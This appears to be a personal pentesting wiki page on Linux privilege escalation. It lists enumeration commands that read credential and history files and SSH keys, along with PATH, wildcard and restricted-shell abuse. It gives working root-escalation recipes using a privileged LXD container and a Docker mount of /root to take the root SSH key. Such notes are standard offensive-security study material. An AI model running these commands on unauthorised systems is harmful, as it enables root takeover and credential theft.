Navigation: [[Pentesting]]

---
[HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) and [Checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
# Table of Contents
1. Enumeration
2. Environment-based Privesc
# Enumeration
We'll need a lot of information before we can escalate privileges. There are a few helper scripts that exist, but it's also good to know how to do this stuff manually. 

Helper scripts: [`LinPEAS`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and [`LinEnum`](https://github.com/rebootuser/LinEnum).
```shell
# General
whoami # check user
id # check groups
hostname # check computer name
ifconfig # check network info
sudo -l # check sudo perms
history # bash history
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null # history files

# Environment
cat /etc/os-release # os version
echo $PATH # check executable paths
env # env variables
uname -a # kernel version
lscpu # cpu info
cat /etc/shells # check existing shells
lpstat # printers
ls -la /etc/cron.daily/ # cron jobs
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n" # system processes info
sudo -V # sudo version
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null # configuration files

# Appplications
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list # installed packages
ls -l /bin /usr/bin/ /usr/sbin/ # binaries
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" # scripts
ps aux | grep <user> # services by user

# Users
cat /etc/passwd # list all users
grep "*sh$" /etc/passwd # find which users have login shells
cat /etc/group # list all groups
getent group sudo # list users who can sudo
ls /home # check users with a home directory
lastlog # check last login from users
w # logged in users

# Files
cat /etc/fstab # mounted and unmounted drives
lsblk # check block devices
df -h # check mounted file systems
cat /etc/fstab | grep -v "#" | column -t # unmounted file systems (as root we can mount then read)

# Hidden files/directories
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <user>
find / -type d -name ".*" -ls 2>/dev/null

# Temporary files
ls -l /tmp /var/tmp /dev/shm

# Network information
ip a
cat /etc/hosts
route # ip routing table
cat /etc/resolv.conf # for domain env, check internal DNS
arp -a # check arp table

# Credentials
ls ~/.ssh # ssh keys
# also check any conf files

# GTFObins
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

# Find files with suid
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

Common defenses to look for:
- [`Exec Shield`](https://en.wikipedia.org/wiki/Exec_Shield)
- [`iptables`](https://linux.die.net/man/8/iptables)
- [`AppArmor`](https://apparmor.net/)
- [`SELinux`](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [`Fail2ban`](https://github.com/fail2ban/fail2ban)
- [`Snort`](https://www.snort.org/faq/what-is-snort)
- [`Uncomplicated Firewall (ufw)`](https://wiki.ubuntu.com/UncomplicatedFirewall)
# Environment-based Privesc
### Path Abuse
Creating a script or program in a PATH directory makes it executable from any directory on the system. By running the following:
```shell
PATH=.:$PATH
export PATH
```
We're able to run binaries from the current working directory. In doing so, we can replace common binaries with our own script.
### Wildcard Abuse
Wildcards are used to replace characters. Here's a table of common wildcards:

| Character | Use                                                                                                   |
| --------- | ----------------------------------------------------------------------------------------------------- |
| `*`       | Replace any number of characters in a file name                                                       |
| `?`       | Match a single character                                                                              |
| `[]`      | Enclose characters and can match any single on at the predefined position                             |
| `~`       | Expands to the name of the users home, if a name is appended at the end it extends to that users home |
| `-`       | Within brackets, it represents a range of characters                                                  |
We can abuse these wildcards when they're used in things like cronjobs or admin scripts.
### Escaping Shells
Types of restricted shells:
- [`Restricted Bourne shell`](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (`rbash`)
- [`Restricted Korn shell`](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`)
- [`Restricted Z shell`](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`)

Common ways to escape:
1. Command injection
2. Command substitution
3. Command chaining
4. Utilizing environment variables
5. Shell functions
# Permissions-based Privesc
### Privileged Groups
**`LCX / LXD`**
This is similar to Docker but native to Ubuntu. All users are added to the group after installation. Escalate privileges by creating a container, making it privileged, then accessing the host file system at `/mnt/root`:
```shell
unzip alpine.zip # alpine image
lxd init # use defaults for all prompts

# Import image and start container
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine # import image
lxc init alpine r00t -c security.privileged=true # start container

# Mount root and start a shell
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true 
lxc start r00t
lxc exec r00t /bin/sh
```
**Docker**
Placing a user in this group is basically root access. 
```shell
 docker run -v /root:/mnt -it ubuntu
 # From here, just grab the root SSH key
 # You can also just mount any directory you want access to
```
**Disk**
Similarly to docker, use `debugfs` to access the entire system with root privileges.
### Capabilities
These are a feature that allows specific privileges to be given to processes. Capabilities are set using the `setcap` command. Here's a list of common capabilities:

|**Capability**|**Description**|
|---|---|
|`cap_sys_admin`|Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.|
|`cap_sys_chroot`|Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.|
|`cap_sys_ptrace`|Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.|
|`cap_sys_nice`|Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.|
|`cap_sys_time`|Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.|
|`cap_sys_resource`|Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.|
|`cap_sys_module`|Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.|
|`cap_net_bind_service`|Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized|
Here's the values for them as well:

|**Capability Values**|**Description**|
|---|---|
|`=`|This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.|
|`+ep`|This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.|
|`+ei`|This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
|`+p`|This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.|
Here's the ones that are interesting:

|**Capability**|**Desciption**|
|---|---|
|`cap_setuid`|Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.|
|`cap_setgid`|Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.|
|`cap_sys_admin`|This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems.|
|`cap_dac_override`|Allows bypassing of file read, write, and execute permission checks.|
Lastly, here's how we can enumerate for capabilities:
```shell
# Enumeration
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

---
Navigation: [[Pentesting]]